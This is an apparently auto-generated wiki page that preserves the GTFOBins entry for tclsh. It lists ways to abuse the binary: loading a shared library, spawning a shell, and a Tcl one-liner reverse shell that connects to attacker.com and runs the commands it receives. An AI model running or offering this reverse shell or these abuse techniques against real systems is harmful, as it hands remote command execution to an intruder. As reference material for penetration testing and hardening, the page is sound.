---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# tclsh

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `tclsh` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/tclsh` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [tclsh](../../tools/linux/tclsh.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | tclsh |
| name | tclsh |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/tclsh/ |

## Preserved Source Material

```yaml
_body: ''
_name: tclsh
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/tclsh
functions:
  library-load:
  - code: 'tclsh

      load /path/to/lib.so x'
    contexts:
      capabilities: null
      sudo: null
      suid: null
      unprivileged: null
  reverse-shell:
  - code: 'tclsh

      set s [socket attacker.com 12345];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set
      r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    listener: tcp-server
  shell:
  - code: tclsh
    contexts:
      sudo: null
      suid: null
      unprivileged: null
```
